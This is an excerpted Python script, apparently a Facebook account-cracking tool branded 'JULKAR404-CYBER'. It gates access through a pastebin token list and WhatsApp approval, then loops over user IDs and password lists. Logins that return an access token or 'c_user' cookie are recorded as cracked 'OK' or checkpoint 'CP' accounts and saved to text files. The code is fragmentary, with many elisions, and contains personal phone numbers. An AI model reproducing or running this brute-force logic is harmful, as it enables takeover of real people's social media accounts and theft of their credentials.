...
def reg():
    ...
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.server.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://pastebin.com/raw/2nQDSDaF').text
    if to in r:
        time.sleep(2)
        bsn_menu()
    else:
        ...
        print(' WhatsApp : +92110760985')
        input('\033[1;97m Press Enter To Send Token')
        os.system('xdg-open https://wa.me/+923110760985?text=Assalamualaikum Sir Approve my Token and my Token :'+to)
        reg()
...
def reg2():
    ...
    os.system('xdg-open https://wa.me/+03110760985?text=Assalamualaikum Sir Approve my Token and my Token :'+id)
    sav = open('/sdcard/Android/.server.txt', 'w')
    sav.write(id)
    sav.close()
    reg()
...
def hasil(OK,cp):
    if len(OK) != 0 or len(cp) != 0:
        ...
        print('----------------------------------------------')
        print(' [%s+%s] \033[1;97mTOTAL OK : %s --- \033[1;97mzwex-ok.txt'%(O,O,str(len(ok))))
        print(' [%s+%s] \033[1;97mTOTAL CP : %s --- \033[1;97mzwex-cp.txt'%(O,O,str(len(cp))))
        print('----------------------------------------------')
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print(" [*]. CREATED BY |:-( Julkar Nayen )");time.sleep (0.03)
    print(" [*]. Tysm To My All Frendz. (JULKAR404-CYBER)");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(" [*]. VERSION  3.0                                    ");time.sleep (0.03)   
    print(" [*]. WP             +8801740308756      ");time.sleep (0.03)
    print(" [*]. This Tool was made in Bangladesh               ");time.sleep (0.03)
    print(" [*] -----------------------------------------------------------------------------------");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
    print(" [*] A N O N Y M O U S  D A R K F A T E  ( JULKAR )    ");time.sleep (0.03)
    print(".[*] ---------------------------------------------");time.sleep(0.03)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [JULKAR] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
            ...
            if "access_token" in p:
                ...
                try:
                    ...
                    print('\r%s \033[1;91m[CP-JULKAR] %s | %s ' % (K,user,pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s \033[1;91m[CP-ZWEX] %s | %s ' % (K,user,pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
